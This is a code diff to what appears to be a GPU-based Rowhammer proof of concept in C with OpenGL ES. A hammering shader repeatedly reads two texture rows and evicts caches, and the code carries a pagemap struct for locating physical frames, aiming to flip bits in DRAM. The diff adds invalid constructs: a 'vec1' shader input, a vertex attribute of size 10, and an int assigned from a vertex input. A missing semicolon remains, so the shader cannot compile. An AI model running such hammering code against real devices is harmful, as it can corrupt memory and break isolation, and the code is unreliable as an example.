@@ -17,6 +17,9 @@ EGLSurface pBuffer;
 EGLContext ctx;
 
 
+int threadID[] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10};
+
+
 struct pagemap_entry{
     uint64_t pfn : 54;
     unsigned int soft_dirty : 1;
@@ -78,15 +81,16 @@ const char *fragmentShaderSource = "#version 300 es\n"
 const char *hammeringShaderSource = "#version 300 es\n"
 	"uniform sampler2D row1;\n"
 	"uniform sampler2D row2;\n"
+	"layout (location = 0) in vec1 threadID;\n"
 	"uniform sampler2D evict1;\n" //  has size of 64 regular pages, needed to evict caches
 	"out vec4 FragColor;\n"
 	"void main(){\n"
 	"	for(int i = 0; i < 2000000; ++i){\n"
 	"		for(int j = 0; j < 64; ++j){\n"
-	"			FragColor = texelFetch(row1, ivec2(j * 16 % 32, j * int(16 / 32), 0);\n"
-	"			FragColor = texelFetch(row2, ivec2(j * 16 % 32, j * int(16 / 32), 0);\n"
+	"			FragColor = texelFetch(row1, ivec2(j * 16 % 32, j * int(16 / 32)), 0);\n"
+	"			FragColor = texelFetch(row2, ivec2(j * 16 % 32, j * int(16 / 32)), 0);\n"
 	"		}\n"
-	"		int id = gl_LocalInvocationIndex % 8;\n"
+	"		int id = threadID % 8;\n"
 	"		id = id * 4096\n"
 	"		FragColor = texelFetch(evict1, ivec2(id % 256, int(id / 256)), 0);\n"
 	"		FragColor = texelFetch(evict1, ivec2(id % 256 + 32, int(id / 256)), 0);\n"
@@ -430,7 +434,8 @@ int main(){
 		glClearColor(0.0f, 0.0f, 0.0f, 0.0f);
 		glClear(GL_COLOR_BUFFER_BIT);
 		glUseProgram(shaderProgram2);
-
+		glVertexAttribPointer(0, 10, GL_INT, GL_FALSE, sizeof(int), (void*)0);
+    	glEnableVertexAttribArray(0);
 
 		// Binding textures
 		GLuint row1TexLocation = glGetUniformLocation(shaderProgram, "row1");
